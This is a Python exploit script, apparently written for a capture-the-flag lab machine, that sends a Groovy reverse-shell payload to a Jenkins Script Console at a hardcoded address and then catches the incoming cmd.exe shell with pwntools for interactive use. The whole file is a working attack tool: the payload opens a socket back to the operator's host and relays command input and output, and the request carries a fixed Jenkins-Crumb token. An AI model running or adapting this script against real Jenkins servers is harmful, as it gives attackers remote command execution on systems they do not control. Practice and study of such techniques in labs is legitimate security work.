#!/usr/bin/python3

import signal, sys, threading
import requests
from pwn import *

# Variables ----------------------.
URL = "http://10.10.10.63:50000/askjeeves"

# Funciones ----------------------.
def def_handler(sig, frame):  # Ctrl+C
    print("\n\n^C~£¡S4liiiend0...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def main(lhost, lport):  # toda la cosita sabroza
    '''
    # Payload from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
    '''

    data_post = {             #  V            V
        "script": "String host='%s';int port=%d;String cmd='cmd.exe';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();" % (lhost, lport),
        "Jenkins-Crumb": "8a83ec51e8da4d50dac31a105c9ed66c",
        "json": "{'script': 'String host='localhost';int port=8044;String cmd='cmd.exe';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();', '': 'String host='localhost';int port=8044;String cmd='cmd.exe';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();', 'Jenkins-Crumb': '8a83ec51e8da4d50dac31a105c9ed66c'}",
        "Submit": "Run"
    }

    try:
        r = requests.post(URL + '/script', data=data_post, timeout=4)
    except requests.exceptions.Timeout:
        pass

def print_help():  # la ayudita del programa
    print("Script to get a Reverse Shell using Jenkins-ScriptConsole (Groovy Language).\n")
    print(f"usage: {sys.argv[0]} LHOST LPORT")
    print("\nexample:\n\t{} 10.10.123.123 4433".format(sys.argv[0]))
    exit(1)

def parse_sys_args():  # validamos argumentos del programa
    if len(sys.argv) != 3:
        print_help()

# Inicio del programa ------------.
if __name__ == '__main__':
    parse_sys_args()

    lhost = sys.argv[1]
    lport = sys.argv[2]

    try:
        threading.Thread(target=main, args=(lhost, int(lport),)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=30).wait_for_connection()

    if shell.sock is None:
        log.failure("Connection was not established...")
        exit(1)

    shell.interactive()